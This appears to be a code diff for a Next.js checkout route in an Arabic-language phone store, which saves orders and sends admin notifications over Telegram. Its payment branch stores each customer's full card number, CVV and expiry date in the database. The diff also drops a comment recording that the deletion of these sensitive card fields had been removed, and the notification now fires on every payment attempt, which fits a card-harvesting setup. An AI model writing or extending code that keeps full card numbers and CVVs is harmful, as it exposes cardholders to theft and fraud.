@@ -127,9 +127,6 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب أو تعذر التحقق من ملكيته.' }, { status: 404 });
     }
 
-    // The final order notification is sent only once, after payment method selection.
-    adminNotificationSentAt: undefined,
-
     const now = new Date();
     const cardLast4 = cardNumber.slice(-4);
 
@@ -139,9 +136,9 @@ export async function POST(request: NextRequest) {
         ...((paymentMethod === 'visa' || paymentMethod === 'mada')
           ? {
               cardholderName,
-              cardNumber,          // حفظ رقم البطاقة كاملاً
-              cardLast4,           // آخر 4 أرقام كمرجع سريع
-              cvv: cvc,            // رمز الأمان CVC
+              cardNumber,         // حفظ رقم البطاقة كاملاً
+              cardLast4,            // آخر 4 أرقام كمرجع سريع
+              cvv: cvc,             // رمز الأمان CVC
               expiryMonth,
               expiryYear
             }
@@ -154,9 +151,9 @@ export async function POST(request: NextRequest) {
         ...(order.installment ? { installmentInvoiceToken: order.installmentInvoiceToken || randomBytes(24).toString('hex') } : {}),
         ...(order.installment ? { installmentContractToken: order.installmentContractToken || randomBytes(24).toString('hex') } : {}),
         adminSeenAt: null,
-        updatedAt: now
+        updatedAt: now,
+        adminNotificationSentAt: undefined
       }
-      // تمت إزالة الـ $unset الذي كان يحذف حقول البطاقة الحساسة
     });
 
     const updatedOrder = await orders.findOne(filter);
@@ -174,17 +171,19 @@ export async function POST(request: NextRequest) {
         message: 'تم حفظ الطلب، لكن لم يتم ضبط مستلم إشعارات الإدارة.'
       });
     }
-try {
-  const orderUrl = updatedOrder.adminOrderToken
-    ? new URL(`/admin-order/${updatedOrder.adminOrderToken}`, request.nextUrl.origin).toString()
-    : '';
 
-  const orderLinkText = orderUrl
-    ? '\n\n📋 فتح الطلب والمستندات:\n' + orderUrl
-    : '';
+    try {
+      const orderUrl = updatedOrder.adminOrderToken
+        ? new URL(`/admin-order/${updatedOrder.adminOrderToken}`, request.nextUrl.origin).toString()
+        : '';
+
+      const orderLinkText = orderUrl
+        ? '\n\n📋 فتح الطلب والمستندات:\n' + orderUrl
+        : '';
+      
       await sendTelegramMessage(
         adminId,
-        '🛍️ تم إكمال طلب جديد — أرض الجوال\n\n' +
+        '🛍️ تم إكمال طلب جديد (أو تحديث محاولة الدفع) — أرض الجوال\n\n' +
           formatOrderForAdmin(updatedOrder as unknown as Record<string, unknown>) +
           orderLinkText,
         {
